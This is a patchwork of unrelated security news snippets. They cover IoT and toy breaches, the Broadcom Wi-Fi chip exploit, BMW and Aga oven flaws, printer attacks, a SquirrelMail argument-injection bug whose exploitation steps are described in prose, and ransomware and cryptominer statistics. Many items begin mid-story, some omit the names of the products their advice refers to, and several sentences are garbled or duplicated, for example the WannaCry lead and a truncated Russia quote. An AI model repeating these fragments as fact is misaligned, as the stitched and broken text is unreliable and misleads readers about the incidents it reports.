Hackers with knowledge of the vulnerabilities can be half a world away but connect over the Internet to a Samsung television or wearable, and assume complete control over the device.
Neiderman didn’t say if hackers have been exploiting some of the flaws built into Tizen, and he has only been analyzing the software for the past eight months.
He believes that many of the 40 flaws—called zero day exploits because there are no fixes and hackers could take advantage of them right now—were caused by Samsung coding errors that were never discovered in product testing.

The most recent breach of smart teddy bears -- which can receive and send voice messages from children and parents -- have been involved in a data breach dealing with more than 800,000 user accounts.
The company behind the products, Spiral Toys, is denying that any customers were hacked.
Zach Lanier, director of research at Cylance, went through the more famous incidents involving toys and breaches and offers a tip with each case.
This may have given attackers access to voice recordings from the toy's customers, by allegedly making the mistake of storing the customer information in a publicly exposed online MongoDB database that required no authentication process.
Thus anyone, including the attackers, was able to view and steal the data.
CloudPets placed no requirement on password strength, making it much easier to decipher passwords.
Tip: Always create a secure password, no matter the strength requirement.
Include lowercase and uppercase letter, symbols and numbers.
Use a password manager to help create and store unique passwords for sites and services.
A line of stuffed animals, these connected toys combine with a mobile application that was vulnerable due to a number of weak APIs, which didn’t verify who sent messages.
This meant that an attacker could guess usernames, or email addresses, and ask Fisher-Price for server return details about associated accounts and children’s profiles, which provides their name, birthdate, gender, language and toys they have played with.
Tip: If the IoT device connects to a mobile app or desktop computer, it is important to examine how it connects.
If the start of the URL address is http rather than https, which is the secure version of HTTP, then your device is making a less secure connection.
The doll has a microphone and accesses the internet to answer your child's questions.
Moreover, criminals could have the ability collect your personal information.
Tip: If the toy does require Wi-Fi, make sure it supports modern, more secure Wi-Fi capabilities like WAP2.
Their speech-recognition software maker Nuance Communications violated federal rules by listening to children and saving the recordings.
It’s valuable to know how they are using your data.
Don’t provide personal information that seems extra or unnecessary.
VTech had its app store database, Learning Lodge, hacked.
As a result of the breach, over 11.6 million accounts were compromised in a cyberattack, exposing photos of children and parents as well as chat logs.
The profile data leaked included their names, genders and birth dates.
Tip: Check to see if the manufacturer has had any cybersecurity issues in the past, and if so, how they responded.
Alternatively, if the company is relatively new, your device is definitely at greater risk.
The interactive toy has the ability to communicate and record conversations.
Those conversations are sent to the company’s servers, analyzed and then stored in the cloud.
The toy was criticized for spying on kids by recording their conversations.
Through Wi-Fi, attackers can hijack the connection to spy on your children, steal personal information, and turn the microphone of the doll into a surveillance device.
Tip: Since the device is Wi-Fi enabled, confirm if the device supports modern security protocols.
If the device only uses WEP or WPA (but not WPA2) security standards, it may be too risky to use.
Those versions are older and over time have become almost entirely insecure from attack.

A broad array of Android phones are vulnerable to attacks that use booby-trapped Wi-Fi signals to achieve full device takeover, a researcher has demonstrated.
The vulnerability resides in a widely used Wi-Fi chipset manufactured by Broadcom and used in both iOS and Android devices.
Apple patched the vulnerability with Monday's release of iOS 10.3.1.
""An attacker within range may be able to execute arbitrary code on the Wi-Fi chip,"" Apple's accompanying advisory warned.
In a highly detailed blog post published Tuesday, the Google Project Zero researcher who discovered the flaw said it allowed the execution of malicious code on a fully updated 6P ""by Wi-Fi proximity alone, requiring no user interaction.""
Google is in the process of releasing an update in its April security bulletin.
The fix is available only to a select number of device models, and even then it can take two weeks or more to be available as an over-the-air update to those who are eligible.
Company representatives didn't respond to an e-mail seeking comment for this post.
The proof-of-concept exploit developed by Project Zero researcher Gal Beniamini uses Wi-Fi frames that contain irregular values.
The values, in turn, cause the firmware running on Broadcom's wireless system-on-chip to overflow its stack.
By using the frames to target timers responsible for carrying out regularly occurring events such as performing scans for adjacent networks, Beniamini managed to overwrite specific regions of device memory with arbitrary shellcode.
Beniamini's code does nothing more than write a benign value to a specific memory address.
Attackers could obviously exploit the same series of flaws to surreptitiously execute malicious code on vulnerable devices within range of a rogue access point.
Besides the specific stack overflow bugs exploited by the proof-of-concept attack, Beniamini said a lack of security protections built into many software and hardware platforms made the Broadcom chipset a prime target.
""We’ve seen that while the firmware implementation on the Wi-Fi SoC is incredibly complex, it still lags behind in terms of security,"" he wrote.
""Specifically, it lacks all basic exploit mitigations—including stack cookies, safe unlinking and access permission protection (by means of [a memory protection unit.])""
The Broadcom chipset contains an MPU, but the researcher found that it's implemented in a way that effectively makes all memory readable, writeable, and executable.
""We can conveniently execute our code directly from the heap.""
He said that Broadcom has informed him that newer versions of the chipset implement the MPU more effectively and also add unspecified additional security mechanisms.
Given the severity of the vulnerability, people with affected devices should install a patch as soon as it's available.
For those with vulnerable iPhones, that's easy enough.
As is all too often the case for Android users, there's no easy way to get a fix immediately, if at all.
That's because Google continues to stagger the release of its monthly patch bundle for the minority of devices that are eligible to receive it.
At the moment, it's not clear if there are effective workarounds available for vulnerable devices.
Turning off Wi-Fi is one possibility, but as revealed in recent research into an unrelated Wi-Fi-related weakness involving Android phones, devices often relay Wi-Fi frames even when Wi-Fi is turned off.

Security researchers discovered a security vulnerability in Android's app permission model that could allow malicious apps to download onto the mobile device directly from Google Play and launch ransomware, adware, and banking malware, according to a Check Point Software blog post today.
Check Point found the flaw in Android version 6.0.0,  otherwise known as the Marshmallow.
""As a temporary solution, Google applied a patch in Android version 6.0.1 that allows the Play Store app to grant run-time permissions, which are later used to grant SYSTEM_ALERT_WINDOW permission to apps installed from the app store. This means that a malicious app downloaded directly from the app store will be automatically granted this dangerous permission,"" Check Point wrote in a blog post today.
The SYSTEM-ALERT-WINDOW mechanism will also effectively bypass security mechanisms introduced in the previous version of Android, according to Check Point.
Google plans to fix the issue in its upcoming ""Android 0"" version.

The Internet of Things (IoT) is placing an unprecedented number of unsecured devices on the Internet every day that are being leveraged by hackers to steal data and to launch Denial of Service Attacks (DDoS).
These devices are coming in the form of thermostats, refrigerators, pet feeders, cameras, healthcare devices, and more.
Gartner estimates that by 2020, 50 Billion connected “things” will be on the internet.
Pushing the escalation of DDoS attacks is the release of the Mirai code which has opened the door for hackers to create their own code to access the vast varieties of IoT devices to be leveraged as bots designed to launch massive DDoS attacks.
This trend is gaining momentum in the threat landscape as hackers experiment with the Mirai code to boost the impact of their DDoS attacks as evidenced by the recent discovery of a record-setting 12.2-day DDoS attack.
What comes next is an exponential windfall for hackers with the introduction of Smart Dust.
Smart Dust is the term used to describe very small chips containing a system of tiny microelectromechanical systems (MEMS) such as sensors, robots, or other devices that can, for example, gather and send sensory data such as temperature, vibration, GPS coordinates and more to an internet host where the data can be stored and analyzed.
These chips are microscopic, can be airborne and will be able to run for years without external power.
Professor Julie McCann takes her inspiration from nature for writing algorithms that allow distributed wireless networks to become self-organizing, adaptive and intelligent.
Smart Dust will be manufactured inexpensively, making it possible to integrate into a variety of products including food or merchandise packaging as a means of tracking.
Smart Dust embedded into a variety of disposable products will eventually end up in a landfill still connected and capable of communicating to the internet via 6LoWPAN.
With the longevity associated with these MEMs and the ability to run without external power, hackers will have unprecedented opportunity to access these unsecured MEMs that can be used to create massively distributed botnets.
Without a definitive end-of-life process, these objects could stay connected to the Internet for years.
In this talk, Jordan Duffy, a serial entrepreneur and technology innovation expert, explores how the internet of things is changing our lives in ways we don’t even recognize.
Ownership and responsibility guidelines need to be hammered out to govern these next generation sensors.
The significant ramifications of not decommissioning Smart Dust properly has the potential to result in an Internet of Zombies.

If you’re a BMW owner, prepare to patch! Chinese researchers have found 14 security vulnerabilities affecting many models.
The ranges affected (some as far back as 2012) are the BMW i Series, X Series, 3 Series, 5 Series and 7 Series, with a total of seven rated serious enough to be assigned CVE numbers.
The vulnerabilities are in in the Telematics Control Unit (TCU), the Central Gateway Module, and Head Unit, across a range of interfaces including via GSM, BMW Remote Service, BMW ConnectedDrive, Remote Diagnosis, NGTP, Bluetooth, and the USB/OBD-II interfaces.
Some require local access (e.g. via USB) to exploit but six including the Bluetooth flaw were accessible remotely, making them the most serious.
Should owners worry that the flaws could be exploited, endangering drivers and vehicles?
On the basis of the technical description, that seems unlikely, although Keen Lab won’t release the full proof-of-concept code until 2019.
Keen Lab described the effect of its hacking as allowing it to carry out: The execution of arbitrary, unauthorized diagnostic requests of BMW in-car systems remotely.
To which BMW responded:
    BMW Group has already implemented security measures, which are currently being rolled out via over-the-air configuration updates. Additional security enhancements for the affected infotainment systems are being developed and will be available as software updates for customers.
In other words, some fixes have already been made, while others will be made between now and early 2019, potentially requiring a trip to a service centre.
Full marks to BMW for promptly responding to the research but the press release issued in its wake reads like PR spin.
To most outsiders, this is a case of Chinese white hats finding vulnerabilities in BMW’s in-car systems.
To BMW, judging by the triumphant language of its press release, it’s as if this was the plan all along, right down to awarding Keen Lab the “first-ever BMW Group Digitalization and IT Research Award.”
More likely, car makers are being caught out by the attention their in-car systems are getting from researchers, with Volkswagen Audi Group experiencing some of the same discomfort a couple of weeks ago at the hands of Dutch researchers. BMW has experienced this before too – three years ago it suffered an embarrassing security flaw in its car ConnectedDrive software door-locking systems.
Let’s not feel too sorry for the car makers because it’s the owners who face the biggest adjustment to their expectations – software flaws and patching are no longer just for computers.

Microsoft has rolled-out security updates to fix a critical remote code execution flaw affecting Windows Defender and other anti-malware products.
Ahead of April's Patch Tuesday, Microsoft has released patches for the critical flaw, which affects Microsoft Malware Protection Engine, or mpengine.dll, the core of Windows Defender in Windows 10.
""An attacker who successfully exploited this vulnerability could execute arbitrary code in the security context of the LocalSystem Account and take control of the system,"" warns Microsoft.
""An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.""
Google Project Zero researcher Thomas Dullien, aka Halvar Flake, discovered that attackers can trigger a memory-corruption issue in the engine if they can get Windows Defender and other affected security products to scan a specially-crafted file.
Microsoft warns there are many ways an attacker could achieve this, including placing the file on a website, in an email or instant message, on any site that hosts files, or in a shared directory.
As with similar vulnerabilities reported last year by the UK's National Cyber Security Centre (NCSC) and Project Zero, an attack would be instant if the affected antivirus has real-time protection enabled.

Although the patch is being released before Microsoft's monthly security update, the bug, CVE2018-0986, is not an out-of-band patch as Microsoft updates the engine as needed.
Microsoft also notes that the default configuration for Microsoft's anti-malware products in the enterprise is to automatically receive updates.

Security researchers from Pen Test Partners have discovered pretty glaring security flaws in Aga's line of smart ovens.
According to researchers, these flaws can be exploited via SMS messages. The reason appears to be that Aga management opted to use a GSM SIM module to control its devices, instead of the classic option of using a Wi-Fi module.
This SMS-based management feature allows Aga users to turn ovens on or off from remote locations by sending an SMS to their device.
In this scenario, an attacker would need a victim's oven SMS number, but Pen Test Partners researchers say the web-based administration panel contains flaws that allow attackers to scrape for all active SIM card numbers assigned to Aga ovens.
There's no authentication involved with the SMS management commands, meaning anyone could send them, and mess around with people's ""smart"" ovens.
Professional cooking ovens, like the Aga iTotal Control, need hours of warming before reaching optimal cooking temperatures. While attackers could annoy oven owners by turning their ovens off, Pen Test Partners say that an ill-intent miscreant could also turn all known Aga ovens on, and cause a spike in electric energy consumption within an area, albeit this could be an exaggerated claim, as there would need to be thousands of these devices laying around.
Besides the non-authenticated SMS-based remote management feature, the research team also discovered other major problems with Aga's smart ovens.
For starters, the Aga web administration panel doesn't use HTTPS and forces users to use a five-digit password, one that's incredibly easy to brute-force.
Second, the Aga mobile app also works via HTTP, but even if developers used HTTPS, the app disables certificate validation on purpose, meaning attackers could use any SSL certificate to intercept traffic coming in and to the app.
After spending two weeks attempting to alert the UK-based IoT manufacturer, Pen Test Researchers decided to go public with their findings yesterday.
Furthermore, Pent Test Partners say that the GSM SIM remote management module used for Aga's iTotal Control smart oven was created by a company called Tekelek, which also ships similar SMS management components for oil storage tanks, heating systems, process control and medical devices.
""These appear to be monitored using SMS, so I wonder where else this bizarre unauthenticated text messaging process might lead,"" said Ken Munro, Pen Test Partners expert.
At the time of writing, and following the public disclosure of the iTotal Control issues, Aga appears to have taken down its web-based administration portal, as Pen Test Partners initially suggested.

Check Point researchers today revealed a new vulnerability on WhatsApp and Telegram’s online platforms – WhatsApp Web & Telegram Web.
By exploiting this vulnerability, attackers could completely take over user accounts, and access victims’ personal and group conversations, photos, videos and other shared files, contact lists, and more.
The vulnerability allows an attacker to send the victim malicious code, hidden within an innocent looking image.
As soon as the user clicks on the image, the attacker can gain full access to the victim’s WhatsApp or Telegram storage data, thus giving full access to the victim’s account.
The attacker can then send the malicious file to all the victim’s contacts, potentially enabling a widespread attack.
Check Point disclosed this information to the WhatsApp and Telegram security teams on March 8, 2017.
WhatsApp and Telegram acknowledged the security issue and developed fixes for worldwide web clients.
“Thankfully, WhatsApp and Telegram responded quickly and responsibly to deploy the mitigation against exploitation of this issue in all web clients,” said Oded Vanunu, head of product vulnerability research at Check Point.
WhatsApp Web users wishing to ensure that they are using the latest version are advised to restart their browser.
WhatsApp and Telegram use end-to-end message encryption as a data security measure, to ensure that only the people communicating can read the messages, and nobody in between.
Yet, the same end-to-end encryption was also the source of this vulnerability.
Since messages were encrypted on the side of the sender, WhatsApp and Telegram were blind to the content, and were therefore unable to prevent malicious content from being sent.
After fixing this vulnerability, content will now be validated before the encryption, allowing malicious files to be blocked.
Both web versions mirror all messages sent and received by the user on the mobile app, and are fully synced with users’ devices.

Adobe has emitted software updates to address a critical vulnerability in Flash Player for Windows, Mac, and Linux.
PC owners and admins will want to upgrade their copies of Flash to version 31.0.0.153 or later in order to get the patch – or just dump the damn thing all together.
The November 20 security update addresses a single flaw, designated CVE-2018-15981. It is a type confusion bug that can be exploited to achieve remote code execution. Basically, an attacker could slip the exploit code into a Flash .swf file, put it on a web page, and covertly install malware on any vulnerable machine that visits the page.
Because Adobe does not maintain a fixed patching schedule for Flash Player, this isn't technically considered an out-of-band band-aid. However, the update does come just one week after Adobe pushed out a handful of fixes for Patch Tuesday, including one for an information disclosure vulnerability in Flash Player.
That Adobe would post another update just one week after their last patch should underscore that CVE-2018-15981 is a serious enough vulnerability to be a priority fix for users and admins.
After installing this latest fix, those who are tired of the constant security threats might also want to consider taking the advice of multiple security experts and developers and at least disable Flash by default if not permanently.
The notoriously vulnerable plugin has long since been surpassed by HTML5, and most major websites have already transitioned away from Flash, leaving it only really useful for specific sites and applications.
Even Adobe wants to kill off Flash. The Photoshop giant has said that by 2020 it plans to formally retire the plugin once and for all.

 Dating sites can make juicy targets for hackers.
 Muslim focused site PureMatrimony.com says it has informed its users of an apparent data breach, and asked them to reset their passwords.
 ""Looking for a practising single Muslim? Look no further. We have over 100,000 members,"" PureMatrimony.com reads. Apart from a focus on a specific demographic, Pure Matrimony works very much like any other dating site, and has a free sign up process.
 Motherboard obtained a list of some 120,000 hashes—a string of characters that can represent a user's password—that were dumped on a password cracking forum, and that appear to relate to Pure Matrimony. They were hashed with the weak MD5 algorithm, meaning that hackers could likely obtain many real passwords from them.
 Indeed, several users on the forum had seemingly successfully cracked a number of the hashes. Many of the hashes, when translated to plaintext versions, read ""purematrimony,"" or ""purematrimony1,"" for example. The posted data did not include any other account information, such as email addresses or usernames.
 ""Customers have already been notified of the incident via email,"" a Pure Matrimony representative told Motherboard in an email. ""Customers have been notified to change their passwords on their profile accounts as well as any other places online where they may have used the same password."" The company claimed that Pure Matrimony's site had not been hacked, but believes a vulnerability in a third party service provider may be to blame. Motherboard could not independently verify this claim.
 ""Our team have taken advice from two separate independent security consultants to ensure that we are doing everything possible to secure our data and protect our members. Aside from the additional security measures and moving our website to a new server, we have informed members and also logged this with the ICO [the UK's Information Commissioner's Office, which upholds data protection in the country],"" the representative added.
 Last year, Motherboard reported on a data breach of another Muslim dating site, Muslim Match. In that case, hackers managed to grab the full content of messages between members.
  The lesson: As Pure Matrimony advises, users should change their passwords, and especially on sites where they used the same login details. But it's not clear how successful a hack might be at breaking into other accounts, since the the data did not include usernames or email addresses.

The average company had four ransomware attacks last year, paid an average ransom of $2,500 per incident, and spent 42 hours dealing with the attack.
""We're nowhere near the end of the ransomware threat,"" said Norman Guadagno, chief evangelist at Carbonite, which provides continuous automated cloud backup services.
Of those who did not pay up, 42 percent said that having a full and accurate backup was the reason.
And only 13 percent said their preparedness to prevent ransomware was ""high.""
""People say, 'I know I should back up, have anti-virus, use strong passwords' -- but they don't do it,"" said Guadagno.
Only 46 percent of respondents said that prevention of ransomware attacks was a high priority for their company.
One reason could be that they don't think the hackers will bother with them.
According to the survey, 55 percent of companies said they thought it was either likely or certain that the ransomware also exfiltrated data from the infected device.
Businesses should not only have anti-virus in place to keep ransomware from getting in, but also train their employees to spot potential attacks.
According to the survey, only 29 percent of respondents said they were confident that their employees could detect risky links or sites.

Commonly used office printers and multi-function devices can be exploited to leak information and execute code, presenting multiple attack vectors that are often overlooked, a security researcher has found.
Jens Müller from the Ruhr-Universität Bochum in Germany published multiple advisories on vulnerabilities that he had discovered as part of his Master's degree thesis on the security of printers.
The vulnerabilites stem from vendors not separating page description languages such as PostScript and PJL/PCL used to generate the output from printer control.
""Potentially harmful commands can be executed by anyone who has the right to print,"" Müller said.
Müller outlined multiple attacks on his Hacking Printers wiki, ranging from accessing print jobs to credentials disclosure and bypassing device security, and included proofs of concept.
HP LaserJet 1200, 4200N and 4250N as well as Dell 3130cn and Samsung Multipress 6345N have a vulnerable line printer daemon (LPD) service that cannot handle usernames with 150 or more characters.
Sending a long username to the LPD service on the above devices crashes the printer, requiring manual restart to bring it back up.
Müller said with correct shellcode and return address, the vulnerability could be used for remote code execution.
More printers than the above are likely to be vulnerable, he said.
It is even possible to launch denial of service attacks against printers that support PJL, and permanently damage the non-volatile random access memory (NVRAM) that is used to persistently store settings for the devices, Müller found.
He tested the NVRAM destruction attack on printers from Brother, Konica Minolta, Lexmark, Dell and HP, and verified that they are vulnerable.
Printers can be attacked via networks or USB interfaces.

The extortion attempt took place on January 11, the first day some Lloyds Bank customers experienced short-lived problems with accessing their online banking portals.
Customers continued to report brief outages in the following two days.
On the third day, on Friday, January 13, Bleeping Computer received two separate tips, via email and Twitter, from two hackers that appeared to know each other.
Hacker #1 sent Bleeping Computer a link to a PasteBin page that contained a copy of an email the group allegedly sent to a high-ranking Lloyds Bank manager.
The email, pictured below, contained a ransom demand disguised as a ""consultancy fee"" the group was asking to reveal ""security issues"" that affected Lloyd Bank's online banking portals.
The hackers were asking for 100 Bitcoin (£75,000 / $94,000).
""Once paid, the services will be back online, you will get a list of flaws related to both services, along with our disappearance,"" the email reads.
A second hacker reached out via Twitter a few hours later and was surprised to find out that his colleague already shared the PasteBin link, confirming they knew each other.
Hacker #2 proceeded to provide a demo that allegedly showed they were behind the Lloyds Bank outages.
The demo was specific with how hackers demonstrate they are behind DDoS attacks.

The exposed data includes names, Social Security numbers, birthdates, contact details, medical record numbers and/or clinical information.
On December 21, 2016, Children's Hospital Los Angeles learned that an unencrypted laptop containing patient data was stolen from the locked vehicle of a Children's Hospital Los Angeles Medical Group physician on October 18, 2016.

Separately, Delaware Insurance Commissioner Trinidad Navarro recently announced that a security breach impacted Summit Reinsurance Services and BCS Financial Corporation, both of which are subcontractors of Highmark Blue Cross Blue Shield of Delaware (h/t Internet Health Management).
On August 8, 2016, Summit discovered that a server containing customer data, including names, Social Security numbers, health insurance information, provider names and/or diagnosis and clinical information, was infected with ransomware.
An investigation determined that the server was first accessed on March 12, 2016.
The breach affects approximately 19,000 Highmark Blue Cross Blue Shield members.
""I would like to ensure Delaware consumers that the Department of Insurance takes this matter seriously and is currently investigating how this occurred,"" Navarro said in a statement.
While Summit sent notification letters to those affected, Navarro noted that many customers may have discarded the letter assuming it was a sales pitch, since they were customers of Highmark Blue Cross Blue Shield, not Summit.
And CoPilot Provider Support Services recently announced that one of its databases used by healthcare professionals to determine whether treatments will be covered by insurance was accessed in October 2015, potentially exposing approximately 220,000 patients' names, genders, birthdates, addresses, phone numbers, health insurers, and in some cases Social Security numbers.
It's not clear why it took the company more than a year to notify those affected.
""We are taking steps to address the situation and to further protect against a similar incident in the future, including utilizing enhanced verification, enhanced encryption and implementing increased security audit activity,"" CoPilot said in a notification letter [PDF] to those affected.

Between the constant talk of the U.S. elections being hacked, organizations being hit daily by ransomware and webcams being drafted into botnet armies and used to take down major internet organizations, 2016 was a year for the record books.
Ransomware attacks increased 267 percent in 2016, comprising almost 70 percent of all malware distributed during the year, an amount Malwarebytes called unprecedented in its State of Malware report.
While ransomware certainly stole the show in 2016, it was far from the only tool used by cybercriminals with malvertising, tech support scams and botnets, but the damage done by other types of malware pale in comparison.
According to Malwarebytes' annual State of Malware report, the amount of ransomware spotted between January and November 2016 comprised 68 percent of all exploits and spam payloads with 400 variants being seen in the wild.
The now defunct Teslacrypt was the leading culprit for the year, even though it was eliminated as a threat in May when its master key was made public.
It was followed by Locky and Cerber, which together managed to do just as much damage during 2016 as Teslacrypt despite getting a late start.
The United States absorbed the most ransomware attacks followed by Germany and Italy.
Malwarebytes researchers noted that the absence of one particular large nation from this list says a lot about where many ransomware attacks originate.
A country that seems to be missing from this list is Russia.
This isn't because Russian citizens,” the report stated, noting that Cerber and Locky both have the odd attribution of not turning on” if they happen to infect a computer residing in Russia.
This is a key clue in possible attribution of the groups behind these families as being associated with, if not located in, Eastern Europe.
It also reveals why Russia is not on our list of the top most infected countries, despite its large population and accessibility to technology,” the report said.
Geography also played a role in who the bad guys targeted with malware.
The report found that 81 percent of ransomware victims in North America were businesses, while consumer suffered the majority, 51 percent, of attacks that took place in Europe.
The company also sees no changes taking place this year with ransomware.
It does not expect any new variants to displace Locky or Cerber, but there will be many new types that are put to use by cybercriminals.
Malwarebyts said 60 percent of the ransomware variants spotted in the last half of 2016 were less than a year old, a trend it sees continuing.
However, even ransomware had some downtime in 2016 with Malwarebytes noting that Kovter malware also had a good run, although being used to distribute ad fraud and not just acting as downloader for other malicious software.
How it is spread also changed moving away from exploit kits and drive by to phishing emails.
The importance of Kovter being used in this fashion lies in the same reason ransomware has taken off; it provides a source of direct profit for the attackers.
Rather than selling password dumps, credit card information and social media accounts to other criminals, having the victim either pay to get their important files back OR utilizing them to defraud the advertising industry are both viable methods of profiting off users directly,” the report stated.
Ad fraud's equally nasty cousin adware also metastasized in 2016 becoming more aggressive and intrusive with one variety, Vonteera, being able to disable anti-virus and other security software.
Adware was also found working in conjunction with tech support scams with the malware implementing a Blue Screen of Death and posting a graphic directing the victim to call a fake tech support center where someone would attempt to rip them off.
In one way adware is even a bigger problem than ransomware.
Malwarebytes found that adware comprises 77 percent of all threats striking enterprises worldwide.
And while it may not be as malicious as ransomware it still is a costly problem.
While adware is classified as a Potentially Unwanted Program (PUP), and therefore not considered as much of a threat as ransomware is to businesses, it can still represent a significant cost to the enterprise to remediate the infection or re-image the machine.
Adware also creates downtime for employees, who may experience slower computers and pop-up ads that distract users from productivity, the report stated.
Botnets also raised their ugly head in 2016, most notoriously with the Mirai botnet attacks in late September and October and in a new way by using compromised Internet of Things devices as soldiers in the botnet army.
Because so few people lock down their IoT devices by changing the preset password and username they are particularly vulnerable to being recruited into a botnet army.
Malwarebytes has called for manufacturers to help make these devices more secure out of the box, but believes the botnet armies will again be on the offensive in 2017.
To develop the data for the report Malwarebytes studied 100 million corporate and consumer computers located in 200 countries between June and November 2016.

Airmail has issued an update today to patch a vulnerability that security researchers said could let malicious third parties access email databases and read a user’s messages.
Security consulting firm Versprite outlined the issue in a blog post this morning, noting how Airmail 3 uses both a custom URL scheme and a so-called “deterministic” file system location for email messages for any given account. Using those two pieces of information, a hacker could theoretically retrieve every one of a user’s messages through a phishing scheme that relies on that custom URL scheme.
Airmail told The Verge that it’s already updated the app in the Mac App store and through its direct download beta program to address the issue, calling it a “very hypothetical” one.

I get an alert on my phone from a news feed around critical vulnerability patches being released by SAP.
Before I discuss the details of the latest two SAP HANA vulnerabilities and the potential business impact, let me take a moment to reiterate that this is the most vulnerable period for any SAP customer with this critical flaw in their IT landscape.
This period, which I call “Hackers Busy Cracking,” started this morning and will not end until affected clients across the globe apply the patch from SAP.
Onapsis Security Research Lab discovered these vulnerabilities but hasn’t published technical details yet.
We do know that the vulnerability is in the user self-service functionality provided by SAP HANA and has been present since SPS09 of SAP HANA, which was released in 2014.
As the name suggests, the user self-service functionality enables users to perform maintenance and support activities for their accounts and for new users to register the accounts.
For this functionality to be useful, it must be accessible from wherever the user population is, be it on internal or external networks.
The second critical vulnerability revolves around session fixation, which can allow an attacker to elevate privileges by impersonating another user in the system.
The SAP HANA 2.0 SPS 00 version is affected by this vulnerability.
User self-service is a good example of technology that is a double-edged sword.
It cuts costs associated with supporting a large user population and reduces the time taken to correct user issues, thus ensuring individuals spend more time as productive users.
However, any unattended mechanism that allows modification of accounts without human intervention will always be an attractive target.
According to the Onapsis report, a combination of vulnerabilities can allow an attacker with remote access to the user self-service functionality to edit any account on the system, including activating previously deactivated accounts.
The natural target for this attack would be the SYSTEM account present in all HANA deployments.
The potential business impact of an attacker with access to the SYSTEM account is extraordinary.
I strongly urge all SAP HANA customers to check their HANA version levels and make immediate plans to prioritize these updates.
SAP customers who have already deployed active threat protection (ATP) controls or third-party products are one step ahead of zero-day threats.
For the rest, look to invest in an active threat monitoring and detection solution — meaning a SAP-specific threat vector detection solution.

Microsoft has published a patch for an Outlook vulnerability first reported in late 2016, but the patch has been deemed incomplete and additional workarounds are needed, according to the security researcher who discovered it.
Yesterday's April 2018 Patch Tuesday updates train included a fix for CVE-2018-0950, a vulnerability in Microsoft Outlook discovered by Will Dormann, a vulnerability analyst at the CERT Coordination Center (CERT/CC).

Outlook retrieves remote OLE content without prompting
According to Dormann, the main problem with CVE-2018-0950 is that Microsoft Outlook will automatically render the content of remote OLE objects embedded inside rich formatted emails without prompting the user, something that Microsoft does in other Office apps such as Word, Excel, and PowerPoint.
This leads to a slew of problems that come from automatically rendering OLE objects, a common attack vector for malware authors.

Microsoft patches SMB attack vector only
In a CERT/CC vulnerability note, Dormann says he notified Microsoft of Outlook's propensity for loading OLE objects without alerting users in November 2016.
After almost 18 months, the company finally issued a patch for the reported issue, but Dormann says the patch does not address the problem at the core of the issue.
According to Microsoft, the CVE-2018-0950 patch delivered yesterday only blocks Outlook from initiating SMB connections when previewing rich formatted emails.
Dormann points out that Outlook still does not prompt user for permission to render OLE objects for email previews.
Furthermore, the researcher also highlights that there are other ways of obtaining the NTLM hashes, such as embedding UNC links to SMB servers inside the email, links that Outlook will automatically make clickable. ""If a user clicks such a link, the impact will be the same as with this vulnerability,"" Dormann says.
But even this incomplete patch is good news. This means that while Outlook will continue to render OLE objects inside email previews, at least these objects can't be used to steal NTLM hashes via SMB anymore.
To avoid attackers from getting their hands on NTLM hashes via SMB altogether, the expert recommends that system administrators apply additional OS-level workarounds,

Users of open source webmail software SquirrelMail are open to remote code execution due to a bug (CVE-2017-7692) discovered independently by two researchers.
“If the target server uses Sendmail and SquirrelMail is configured to use it as a command-line program, it’s possible to trick sendmail into using an attacker-provided configuration file that triggers the execution of an arbitrary command,” the explanation provided by MITRE reads. 
“For exploitation, the attacker must upload a sendmail.cf file as an email attachment, and inject the sendmail.cf filename with the -C option within the ‘Options > Personal Informations > Email Address’ setting.”
The bug was found by researchers Filippo Cavallarin and Dawid Golunski, independently of one another, and affects SquirrelMail versions 1.4.22 and below. 
Golunski reported it to SquirrelMail (sole) developer Paul Lesniewski, who asked for a delay of publication of the details until he could fix the flaw.
But as Cavallarin published details about it last week (after not receiving any reply by the SquirrelMail developer), Golunski did the same during the weekend.
Both researchers provided a proof-of-concept exploit for the flaw, and Cavallarin even offered an unofficial patch for plugging the hole.
All this prompted Lesniewski to push out a patch on Monday, and new, patched version snapshots of the software (1.4.23-svn and 1.5.2-svn).
He also told The Register that exploitation of the bug is difficult to pull off.
“In order to exploit the bug, a malicious user would need to have already gained control over a mail account by other means, SquirrelMail would need to be configured to allow users to change their outgoing email address (we recommend keeping this disabled), the user would need to determine the location of the attachments directory (by gaining shell access or making guesses), the permissions on said directory and files would need to allow access by other processes (by default this will usually be the case, but prudent admins will exert more stringent access controls) and of course, SquirrelMail needs to be configured to send via Sendmail and not SMTP (default is SMTP),” he explained.
Still, according to Golunski, the 1.4.23 version snapshot offered on Monday was still vulnerable. But another one was pushed out today, so it’s possible that the issue was finally, definitely fixed.
Users can wait to update their installation until things become more clear, and in the meantime, they can protect themselves by configuring their systems not to use Sendmail.

Cyber security experts reveal they have found a second massive computer virus which has affected hundreds of thousands of computers world-wide, like the WannaCry cyber attack last week, has affected hundreds of thousands of computers world-wide and may have North Korean origins.
This second global hack exploits the same Microsoft vulnerabilities as the WannaCry attack and it is estimated to have infected more than 200,000 computers. The full scale of this attack, however, is still being determined due to the fact the attack is on-going. 
Preliminary analysis by California-based cyber security firm Proofpoint, which revealed the existence of this more subtle virus, suggests “that this attack may be larger in scale than WannaCry”, the company said in an online statement.
Unlike last week’s attack which infected more than 300,000 computers since last Friday, this second cyber attack is thought to have begun either in late April or early May, but it had avoided being detected until recently, said Proofpoint researchers. 
Computers infected by this second virus do not have their functions altered, nor are their files encrypted. Instead, they manufacture digital currency.
Proofpoint said the virus installs the Adylkuzz currency “miner” – a sort of malware which hijacks a computer’s processing power to solve complex math problems and earn digital money.
There exists several different kinds of online currencies, the most famous being Bitcoin. But this second attack is designed to generate a newer form of digital cash called Monero.
Monero offers enhanced anonymity features and is the currency of darknet market place AlphaBay. Experts also believe the currency has been pursued by North Korea-linked hacker groups. 
Proofpoint estimates this relatively unobtrusive computer virus generated more than a million euro – much more than what the WannaCry hackers extorted from their ransomware attack.   
A North Korean hacker group called the Lazarus Group is thought to be behind last week’s massive ransomware attack and now it is thought a segment of this hacker group may be behind the currency mining attack.
Kapersky Lab, a cyber security firm, said a segment of the Lazarus group had installed software on a European server in early April to mine Monero currency, said Reuters.
Proofpoint executive Ryan Kalember, speaking to Reuters, said he believes these two attacks are “more than coincidence”. 
“It’s a really strong overlap”, he told Reuters. “It’s not like you see Monero miners all over the world.”

It has not been a good week for PDF programs. We had an Adobe Acrobat & Reader update released yesterday that fixed 86 vulnerabilities, including numerous critical ones. Not to be beaten, an update for Foxit PDF Reader and Foxit PhantomPDF was released last Friday that fixes a whopping 116 vulnerabilities, with 18 of them being discovered by the Cisco Talos group.
